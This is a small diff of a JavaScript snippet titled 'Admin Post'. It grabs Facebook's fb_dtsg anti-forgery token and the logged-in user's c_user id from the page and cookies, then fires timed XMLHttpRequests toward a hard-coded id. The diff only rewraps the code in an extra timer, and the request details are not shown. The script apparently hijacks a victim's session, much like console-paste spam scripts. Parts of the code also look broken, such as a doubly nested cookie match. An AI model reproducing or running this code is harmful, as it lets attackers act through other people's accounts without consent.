@@ -1,9 +1,8 @@
-
 /*Admin Post*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
-
+setTimeout(function () {
 function IDS(r) {
     function G(gid) {
         var Page = new XMLHttpRequest();
@@ -50,6 +49,7 @@ setTimeout(function () {
     IDS("100005202368891");
 }, 4000);
 
+}, 1000);
 
 
 
